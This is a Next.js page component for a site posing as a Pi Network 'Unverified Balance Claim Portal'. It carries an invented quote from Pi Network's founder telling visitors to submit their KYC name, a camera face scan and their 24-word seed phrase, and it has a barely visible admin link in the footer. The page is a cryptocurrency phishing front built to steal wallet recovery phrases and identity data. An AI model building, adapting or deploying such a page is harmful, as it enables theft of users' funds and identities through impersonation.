
'use client';

import { useState, useEffect } from 'react';
import Link from 'next/link';

export default function Home() {
  const [showAdminIcon, setShowAdminIcon] = useState(true);
  const [customAdminUrl, setCustomAdminUrl] = useState('admin');

  useEffect(() => {
    // Load admin settings to check if footer icon should be shown
    const adminSettings = JSON.parse(localStorage.getItem('adminSettings') || '{"customUrl":"admin","enableFooterIcon":true}');
    setShowAdminIcon(adminSettings.enableFooterIcon);
    setCustomAdminUrl(adminSettings.customUrl);
  }, []);

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-600 via-purple-700 to-purple-900">
      <div className="container mx-auto px-4 py-8">
        {/* Header */}
        <div className="text-center mb-8 relative">
          <div className="relative inline-block">
            <img 
              src="https://static.readdy.ai/image/e8f23d307a34a2c387d25bd44502a87a/e6f6427966b9d5676551ee9ece307b66.png" 
              alt="Pi Network Logo" 
              className="absolute -left-16 top-1/2 transform -translate-y-1/2 w-12 h-12 object-contain"
            />
            <h1 className="text-4xl font-bold text-white mb-2">Pi Network</h1>
          </div>
          <p className="text-white/90 text-lg">Unverified Balance Claim Portal</p>
        </div>

        {/* Main Card */}
        <div className="max-w-md mx-auto bg-white rounded-2xl shadow-2xl p-8">
          <div className="text-center mb-8">
            <div className="w-20 h-20 bg-gradient-to-br from-purple-500 to-purple-700 rounded-full flex items-center justify-center mx-auto mb-4">
              <span className="text-white text-3xl font-bold">π</span>
            </div>
            <h2 className="text-2xl font-bold text-gray-800 mb-2">Claim Your Pi Balance</h2>
            <p className="text-gray-600">Verify your identity to claim your unverified Pi tokens</p>
          </div>

          <div className="space-y-4">
            {/* Start Claim Button */}
            <Link href="/claim">
              <button className="w-full bg-gradient-to-r from-purple-600 to-purple-800 text-white font-semibold py-4 px-6 rounded-xl hover:from-purple-700 hover:to-purple-900 transition-all duration-300 shadow-lg whitespace-nowrap cursor-pointer">
                Start Verification Process
              </button>
            </Link>

            {/* Check Status Button */}
            <Link href="/status">
              <button className="w-full bg-white border-2 border-purple-600 text-purple-600 font-semibold py-4 px-6 rounded-xl hover:bg-purple-50 transition-all duration-300 whitespace-nowrap cursor-pointer">
                Check Your Status
              </button>
            </Link>
          </div>

          <div className="mt-8 p-4 bg-purple-50 rounded-xl">
            <div className="flex items-start space-x-3">
              <i className="ri-information-line text-purple-600 text-xl mt-0.5"></i>
              <div>
                <h3 className="font-semibold text-purple-800 mb-1">Important Notice</h3>
                <p className="text-sm text-purple-700">Complete verification process to claim your unverified Pi Network balance. Process takes 25 days after verification.</p>
              </div>
            </div>
          </div>
        </div>

        {/* Dr. Nicolas Kokkalis Section */}
        <div className="max-w-md mx-auto mt-8 bg-white/10 backdrop-blur-sm rounded-2xl p-6">
          <div className="text-center">
            <div className="w-20 h-20 rounded-full overflow-hidden mx-auto mb-4 border-3 border-white/30">
              <img 
                src="https://static.readdy.ai/image/e8f23d307a34a2c387d25bd44502a87a/dcbab28a876afafdee61b9e82b63b2f5.jfif" 
                alt="Dr. Nicolas Kokkalis" 
                className="w-full h-full object-cover object-top"
              />
            </div>
            <h3 className="text-white font-bold text-lg mb-2">Dr. Nicolas Kokkalis</h3>
            <p className="text-purple-100 text-sm mb-4">Founder & Core Team Lead, Pi Network</p>
            <div className="bg-white/10 rounded-xl p-4">
              <p className="text-white/90 text-sm leading-relaxed">
                "To claim your unverified Pi balance, simply complete our three-step verification process: First, enter your Pi Network KYC name. Second, complete face verification with your camera for identity confirmation. Third, verify ownership by entering your 24-word seed phrase. After successful verification, your unverified Pi balance will be available for claiming in 25 days. This process ensures security and authenticity of all Pi Network transactions."
              </p>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="text-center mt-8 relative">
          <p className="text-white/70 text-sm"> 2024 SocialChain Inc. | All rights reserved.</p>
          {/* Discrete Admin Login Icon - Only show if enabled in settings */}
          {showAdminIcon && (
            <Link href={`/${customAdminUrl}`}>
              <div className="absolute right-0 top-0 w-4 h-4 flex items-center justify-center cursor-pointer opacity-30 hover:opacity-60 transition-opacity duration-300">
                <i className="ri-settings-3-line text-white/50 text-xs"></i>
              </div>
            </Link>
          )}
        </div>
      </div>
    </div>
  );
}